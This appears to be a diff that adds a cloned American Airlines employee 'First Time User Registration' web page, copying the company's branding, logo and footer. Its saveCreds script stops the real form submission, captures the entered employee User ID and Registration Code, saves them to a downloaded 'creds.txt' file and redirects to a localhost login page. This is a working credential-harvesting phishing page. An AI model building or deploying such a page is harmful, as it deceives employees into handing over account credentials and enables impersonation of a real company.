@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+  <script type="text/javascript" src="/identity-ftur/ruxitagentjs_ICA7NQVfqrux_10319250807130352.js" data-dtconfig="app=762b2f4ff770d419|owasp=1|featureHash=ICA7NQVfqrux|msl=153600|nsfnv=1|rdnt=1|uxrgce=1|cuc=uv6v8cp1|srms=2,2,1,|mel=100000|expw=1|dpvc=1|lastModification=1756913995514|tp=500,50,0|srbbv=2|agentUri=/identity-ftur/ruxitagentjs_ICA7NQVfqrux_10319250807130352.js|reportUrl=/identity-ftur/rb_bf04553ytd|rid=RID_-1363344683|rpid=-893650252|domain=aa.com"></script>
+  <title>First Time User Registration</title>
+
+  <link rel="shortcut icon" type="image/png" href="/identity-ftur/static/img/favicon.png"/>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="" />
+  <meta name="keywords" content=" " />
+
+  <style>
+    html {
+      font-family: Arial;
+      font-size: 14px;
+    }
+
+    button {
+      padding: 10px 35px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    h2 {
+      color: #0078D2;
+      font-size: 24px;
+      font-weight: normal;
+    }
+    
+    .text_11_blue { 
+      font-size: 11px;
+      color: #00467F;
+    }
+
+    a.text_11_blue:link, 
+    a.text_11_blue:visited, 
+    a.text_11_blue:hover, 
+    a.text_11_blue:active  {
+      color: #00467F;
+    }
+
+    .error {
+      margin-left: 5px;
+      color: #F52305;
+    }
+
+    a:link {
+      color: #00467F;
+    }
+
+    a:visited {
+      color: #4DB4FA;
+    }
+
+    .submitbutton {
+      background-color: #0078D2;
+      border: 1px solid #0078D2;
+      color: white;
+    }
+
+    .submitbutton:hover {
+      background-color: #4DB4FA;
+      border: 1px solid #4DB4FA;
+    }
+
+    .cancelbutton {
+      background-color: white;
+      color: #0078D2;
+      border: 1px solid #0078D2;
+    }
+
+    .cancelbutton:hover {
+      border: 1px solid #4DB4FA;
+      color: #4DB4FA;
+    }
+  </style>
+
+  <script type="text/javascript">
+    if (top.location != location) {
+      top.location.href = document.location.href;
+    }
+
+    function clickDiv() {
+      document.getElementById("formABC").style.cursor = "wait";
+      setTimeout(function() {
+        document.getElementById("formABC").style.cursor = "pointer";
+      }, 10000000000);
+      document.getElementById("btnSubmit").style.cursor = "wait";
+      setTimeout(function() {
+        document.getElementById("btnSubmit").style.cursor = "pointer";
+      }, 10000000000);
+    }
+
+    function saveCreds(event) {
+      event.preventDefault(); // stop real submission
+
+      const user = document.getElementById("anonymousUser").value;
+      const code = document.getElementById("registrationCode").value;
+
+      console.log(user, code);
+
+      // Format entry
+      const entry = `User: ${user} | RegistrationCode: ${code}\n`;
+
+      // Create a Blob and download as creds.txt
+      const blob = new Blob([entry], { type: "text/plain" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "creds.txt";
+      a.click();
+ document.location="http://127.0.0.1:5500/html/login.html"
+    }
+
+
+  </script>
+</head>
+
+<body>
+<header>
+  <div id="logos"> 
+    <div class="logo" id="logo-aa">
+      <img src="https://sam.aa.com/identity-ftur/static/img/amairlines.jpg" width="550" height="60" alt="AA Logo"/>
+    </div>       
+  </div>
+</header>
+
+<form id="formABC" enctype="application/x-www-form-urlencoded" onsubmit="saveCreds(event)">
+  <h2 style="margin-left: 5px;">First Time User Registration</h2>
+  
+  <p>&nbsp;&nbsp;Please identify yourself by entering your 6 or 8-digit AA User
+    ID. You may need to add leading zeros. &#40;Example: 000123 or
+    00123456&#41;</p>
+  <table width="100%" border="0" cellspacing="0" cellpadding="5">
+    <tr>
+      <td class="formoddrow" align="right" width="125">
+        <label for="anonymousUser"><b>User ID</b></label>
+      </td>
+      <td class="formoddrow">
+        <table border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="formoddrow" nowrap="nowrap">
+              <input id="anonymousUser" name="anonymousUser" tabindex="1000" style="width: 210px;" onfocus="this.select();" type="text" value="" size="27" maxlength="8"/>
+              <img src="/identity-ftur/static/img/required.png" style="margin-right: 10px; width: 7px; height:14px" title="Required" alt="Required" />
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+    <tr>
+      <td class="formevenrow" align="right" width="60"></td>
+      <td class="formevenrow">
+        <table border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="formevenrow" nowrap="nowrap"><b>(Employee/Contractor Number)</b>&nbsp;&nbsp;</td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+    <tr>
+      <td class="formevenrow" align="right" width="60">
+        <label for="registrationCode" id="pwdTop">Registration Code</label>
+      </td>
+      <td class="formevenrow">
+        <table border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="formevenrow" nowrap="nowrap">
+              <input id="registrationCode" name="registrationCode" aria-required="true" aria-invalid="false" style="width: 210px;" type="text" autofocus="autofocus" value="" size="16" maxlength="32"/> 
+              <img src="/identity-ftur/static/img/required.png" style="margin-right: 10px; width: 7px; height:14px" title="Required" alt="Required" />
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+  <br><br>
+  <div align="left" class="error" style="margin: 5px 10px 5px 0px;">
+&nbsp;* indicates a required field
+  </div>
+  <br><br>
+  <table width="100%" border="0" cellpadding="0" cellspacing="0" title="">
+    <tr>
+      <td>
+        <button class="submitbutton" type="submit" id="btnSubmit" onclick="clickDiv()">Submit</button>
+        &nbsp;
+        <button class="cancelbutton" type="button" onclick="window.location.href='http://sam.aa.com/identity'">Cancel</button>
+      </td>
+    </tr>
+  </table>
+</form>
+
+<div class="wrap-outer">
+  <footer id="footer" class="position" role="contentinfo" aria-label="footer">      
+    <br>
+    <span class="text_11_blue">
+      <center><b>&copy;<script>document.write(new Date().getFullYear());</script> American Airlines, Inc. All Rights Reserved. <a href="/identity-ftur/static/htm/Terms_Conditions(072407).htm" class="text_11_blue" target="_blank">View/Print Terms of Use</a></b></center>
+    </span>
+  </footer>
+</div>   
+
+
+
+</body>
+</html>
